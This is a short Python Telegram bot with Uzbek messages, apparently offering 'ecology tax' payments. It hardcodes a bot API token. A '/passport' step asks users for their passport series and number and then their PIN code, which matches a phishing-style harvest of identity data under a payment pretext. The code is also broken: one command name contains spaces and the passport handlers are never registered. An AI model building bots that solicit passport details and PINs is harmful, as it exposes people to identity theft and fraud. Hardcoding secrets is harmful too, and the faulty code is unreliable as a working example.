from telegram.ext import Updater, CommandHandler, ConversationHandler

# /start buyrug'i
def start(update, context):
    update.message.reply_text("Assalomu alaykum! Eco sfera botiga xush kelibsiz!")

# /ekologiya buyrug'i
def ekologiya(update, context):
    update.message.reply_text("Bu yerdan ekologiya soliq to'lovlarini amalga oshirishingiz mumkin.")

# Botni yaratish va ishga tushirish
print("it work!")
def main():
    updater = Updater("6711282599:AAH3hu0qo81asElRYLci17SOwdkHZxw8FiA", use_context=True, update_queue=None)

    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start your bot", start))
    dp.add_handler(CommandHandler("ekologiya", ekologiya))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()

# Anonimlik uchun passport ma'lumotlarini so'raydigan qadamlar
AWAITING_PASSPORT = 0

# /passport buyrug'i
def passport(update, context):
    update.message.reply_text("Iltimos, passport ma'lumotlaringizni kiriting: (seriya, raqam)")
    return AWAITING_PASSPORT

# Passport ma'lumotlarini olish
def get_passport(update, context):
    passport_info = update.message.text
    update.message.reply_text(f"Passport ma'lumotlaringiz: {passport_info}. Iltimos, PIN-kodingizni ham kiriting.")
    return ConversationHandler.END
